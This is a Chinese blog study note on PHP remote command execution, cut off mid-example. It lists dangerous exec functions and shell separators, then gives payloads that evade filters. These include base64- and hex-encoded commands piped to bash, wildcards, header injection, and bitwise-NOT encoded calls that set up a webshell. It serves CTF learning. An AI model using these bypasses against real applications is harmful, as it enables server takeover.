  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>2</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>1</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">20</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/web/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web</span></a><a class="article-meta__tags" href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>后端漏洞</span></a></span></div></div><h1 class="post-title" itemprop="name headline">远程命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-13T00:41:34.000Z" title="发表于 2024-05-13 08:41:34">2024-05-13</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-13T00:43:39.791Z" title="更新于 2024-05-13 08:43:39">2024-05-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">15.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>61分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="远程命令执行"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><a href="/tags/web/" tabindex="-1" itemprop="url">web</a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" tabindex="-1" itemprop="url">后端漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">远程命令执行</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-05-13T00:41:34.000Z" title="发表于 2024-05-13 08:41:34">2024-05-13</time><time itemprop="dateCreated datePublished" datetime="2024-05-13T00:43:39.791Z" title="更新于 2024-05-13 08:43:39">2024-05-13</time></header><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><strong>RCE</strong>漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p>
<p>后端漏洞</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一般出现这种漏洞，是因为<strong>应用系统从设计上需要给用户提供指定的远程命令操作的接口</strong>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
<p><strong>在Web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞</strong></p>
<h2 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h2><blockquote>
<p>system()     能将字符串作为OS命令执行，且返回命令执行结果</p>
<p>passthru()   能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输</p>
<p>​             出到标准输出设备上         </p>
<p>shell_exec()    能将字符串作为OS命令执行</p>
<p>exec()     能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)</p>
<p>shell_exec()     能将字符串作为OS命令执行</p>
<p>popen()    打开进程文件指针</p>
<p>proc_open()    与popen()类似</p>
<p>pcntl_exec()    在当前进程空间执行指定程序</p>
</blockquote>
<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><blockquote>
<p>eval()：将字符串作为php代码执行；</p>
<p>assert()：将字符串作为php代码执行；</p>
<p>preg_replace()：正则匹配替换字符串；</p>
<p>create_function()：主要创建匿名函数；</p>
<p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p>
<p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p>
<p>可变函数： 若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数   </p>
<p>​         执行</p>
</blockquote>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>Linux:</p>
<table>
<thead>
<tr>
<th>管道符</th>
<th>实例</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>;</td>
<td>A;B</td>
<td>无论真假，A与B都执行</td>
</tr>
<tr>
<td>&amp;</td>
<td>A&amp;B</td>
<td>无论真假，A与B都执行</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>A&amp;&amp;B</td>
<td>A为真时才执行B，否则只执行A</td>
</tr>
<tr>
<td>|</td>
<td>A|B</td>
<td>显示B的执行结果</td>
</tr>
<tr>
<td>||</td>
<td>A||B</td>
<td>A为假时才执行B，否则只执行A</td>
</tr>
</tbody></table>
<p>Windows:</p>
<table>
<thead>
<tr>
<th>管道符</th>
<th>实例</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>A|B</td>
<td>显示B的执行结果</td>
</tr>
<tr>
<td>||</td>
<td>A||B</td>
<td>A为假时才执行B，否则只执行A</td>
</tr>
<tr>
<td>&amp;</td>
<td>A&amp;B</td>
<td>无论真假，A与B都执行</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>A&amp;&amp;B</td>
<td>A为真时才执行B，否则只执行A</td>
</tr>
</tbody></table>
<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><table>
<thead>
<tr>
<th>以下可代替空格</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>&lt;</td>
<td>&lt;&gt;</td>
<td>%20(即space)</td>
</tr>
<tr>
<td>%09(即tab)</td>
<td><code>$IFS$9</code></td>
<td>${IFS}</td>
</tr>
<tr>
<td>$IFS</td>
<td>{cat,&#x2F;flag}</td>
<td></td>
</tr>
</tbody></table>
<p><code>$IFS</code>在linux下表示分隔符，但是如果单纯的<code>cat$IFS2</code>，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个<code>$</code>可以起到截断的作用，使用<code>$9</code>是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
<h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>比如说禁用了cat ls flag等</p>
<p><strong>\绕过</strong></p>
<blockquote>
<p>c\at &#x2F;flag</p>
<p>l\s &#x2F;</p>
</blockquote>
<p><strong>单引号绕过</strong></p>
<blockquote>
<p>c’’at flag</p>
<p>l’’s &#x2F;</p>
</blockquote>
<p><strong>双引号绕过</strong> </p>
<blockquote>
<p>c””at flag</p>
<p>l””s &#x2F;</p>
</blockquote>
<p><strong>Shell 特殊变量绕过</strong></p>
<blockquote>
<p>ca$@t flag</p>
</blockquote>
<p><strong>变量拼接</strong></p>
<blockquote>
<p>b&#x3D;ag</p>
<p>cat &#x2F;fl$b</p>
</blockquote>
<p><strong>读flag</strong></p>
<blockquote>
<p>eval(var_dump(file_get_contents($_POST[‘a’])););&amp;a&#x3D;&#x2F;flag</p>
</blockquote>
<p><strong>_过滤</strong></p>
<blockquote>
<p>php8以下，变量名中的第一个非法字符[会被替换为下划线_</p>
<p>e_v.a.l&#x3D;&#x3D;&gt;e[v.a.l</p>
</blockquote>
<p><strong>php标签过滤</strong></p>
<p><code>?&gt;&lt;?= phpinfo(); ?&gt;</code></p>
<p><code>&lt;? ?&gt;等价于&lt;?php ?&gt;</code></p>
<p><code>&lt;?= &gt;等价于&lt;?php echo ?&gt;</code></p>
<p><strong>编码绕过</strong></p>
<p>可以使用各种编码进行绕过</p>
<blockquote>
<p>base64编码绕过,编码cat &#x2F;flag，反引号、| bash、<code>$()</code>用于执行系统命令<br>echo Y2F0IC9mbGFn | base64 -d&#96;<br>echo Y2F0IC9mbGFn | base64 -d | bash<br>$(echo Y2F0IC9mbGFn | base64 -d)</p>
<p>hex编码绕过，编码cat &#x2F;flag,| bash用于执行系统命令<br>echo ‘636174202f666c6167’ | xxd -r -p | bash</p>
<p>shellcode编码<br>十六进制编码</p>
</blockquote>
<p><strong>正则匹配的绕过</strong></p>
<blockquote>
<p>cat &#x2F;f???</p>
<p>cat &#x2F;fl*</p>
<p>cat &#x2F;f[a-z]{3}</p>
</blockquote>
<h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><h4 id="cat替换命令"><a href="#cat替换命令" class="headerlink" title="cat替换命令"></a>cat替换命令</h4><table>
<thead>
<tr>
<th>more</th>
<th>less</th>
<th>cat</th>
<th>tac</th>
</tr>
</thead>
<tbody><tr>
<td>head</td>
<td>tail</td>
<td>vi</td>
<td>vim</td>
</tr>
<tr>
<td>nl</td>
<td>od</td>
<td>sort</td>
<td>uniq</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>tac</th>
<th>与cat相反，按行反向输出</th>
</tr>
</thead>
<tbody><tr>
<td>more</td>
<td>按页显示，用于文件内容较多且不能滚动屏幕时查看文件</td>
</tr>
<tr>
<td>less</td>
<td>与more类似</td>
</tr>
<tr>
<td>tail</td>
<td>查看文件末几行</td>
</tr>
<tr>
<td>head</td>
<td>查看文件首几行</td>
</tr>
<tr>
<td>nl</td>
<td>在cat查看文件的基础上显示行号</td>
</tr>
<tr>
<td>od</td>
<td>以二进制方式读文件，od -A d -c &#x2F;flag转人可读字符</td>
</tr>
<tr>
<td>xxd</td>
<td>以二进制方式读文件，同时有可读字符显示</td>
</tr>
<tr>
<td>sort</td>
<td>排序文件</td>
</tr>
<tr>
<td>uniq</td>
<td>报告或删除文件的重复行</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>file</th>
<th>报错文件内容</th>
</tr>
</thead>
<tbody><tr>
<td>grep</td>
<td>过滤查找字符串，grep flag &#x2F;flag</td>
</tr>
</tbody></table>
<h4 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//php正则的回溯次数大于1000000次时返回False</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>*<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure>

<h4 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161d1796e4.png" alt="image-20240329233618962"></p>
<p><code>system(current(getallheaders()));</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gettallheaders()将报文头信息转为数组返回</span><br><span class="line">current（）将数组当前元素返回（默认指向第一个元素）</span><br><span class="line">因此我们只需在报文头最前面添加一个执行命令即可</span><br></pre></td></tr></table></figure>

<p><code>passthru</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line"></span><br><span class="line">$Str=passthru（chr(108).chr(115).chr(32).chr(47)）;(等于`ls /`)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>scandir</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));       （chr(47)==/,该命令会显示根目录下的文件）</span><br><span class="line"></span><br><span class="line">var_dump(scandir(‘./’)) 查看上级目录来查看当前文件名</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;););读根目录：</span><br></pre></td></tr></table></figure>

<p><code>glob</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob(&quot;*&quot;)  匹配任意文件</span><br><span class="line">glob(&quot;*.txt&quot;)  匹配以txt为后缀的文件</span><br><span class="line"></span><br><span class="line">所以也可以使用：</span><br><span class="line">?cmd=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure>

<h4 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">？c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">还有get_defined_vars()的形式</span><br><span class="line"></span><br><span class="line">?c=include/require$_GET[1];&amp;1=php://filter/convert.base64-encode/resource=flag.php   伪协议的嵌套</span><br></pre></td></tr></table></figure>

<h4 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h4><p>假如过滤分号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么可以直接 ?&gt; 闭合php（ ?&gt; 闭合的是eval里面的php语句，eval后续还有语句的话，依旧是会执行的。除此以外，php代码最后一句可以不用加分号，可以绕过分号的过滤）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如下面代码所示</span><br><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>preg_match()遇到数组会直接返回flase。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a[]=&#x27;flag.php&#x27;;</span><br><span class="line">     </span><br><span class="line">$a=array(&#x27;flag.php&#x27;);</span><br><span class="line">     </span><br><span class="line">$a=[&#x27;flag.php&#x27;];</span><br></pre></td></tr></table></figure>







<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>取反符号~，用的字符不会触发正则表达式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取反传参</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出得到取反传参内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?cmd=(~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$d</span>.<span class="string">&quot;);&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//在命令行中运行</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果要<strong>绕过正则RCE</strong>，我们可以采用url取反绕过，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br><span class="line"># %8F%97%8F%96%91%99%90 : phpinfo</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ccaf36c.png" alt="image-20240330111337425"></p>
<ul>
<li><p>这里还利用了一点是：对于PHP，形如 <code>(func_name)()</code>，其中func_name可以是字符串，会执行这个func</p>
</li>
<li><p>这里相当于执行了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo()</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cd91713.png" alt="image-20240330112128952"></p>
<p>但是</p>
<p>上述代码取反后应该是(system)(ls); 并不是正常的system(ls);</p>
<p>所以如果直接执行phpinfo() 是不会被执行的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90%D7%D6);</span><br><span class="line"># %8F%97%8F%96%91%99%90%D7%D6 : phpinfo()</span><br></pre></td></tr></table></figure>

<ul>
<li>当 <code>(~%8F%97%8F%96%91%99%90%D7%D6);</code>被当作代码执行时的第一步就是取反操作 <code>~</code></li>
<li>但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></li>
</ul>
<p>所以：</p>
<p><strong>对于已知过滤条件，想要执行我们指定的代码，必须有 <code>(func_name)()</code>这样的形式</strong></p>
<p>那么想用蚁剑这样的工具的话，需要让其执行我们POST提交的数据，由问题1可以知道，若构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</span><br><span class="line"># %DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2 : $_POST[shell]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样是不能得到执行结果的</p>
<p>以<code>(func_name)()</code>这样的形式，去执行 <code>(&quot;assert&quot;)(&quot;$_POST[shell]&quot;)</code> 构造payload：</p>
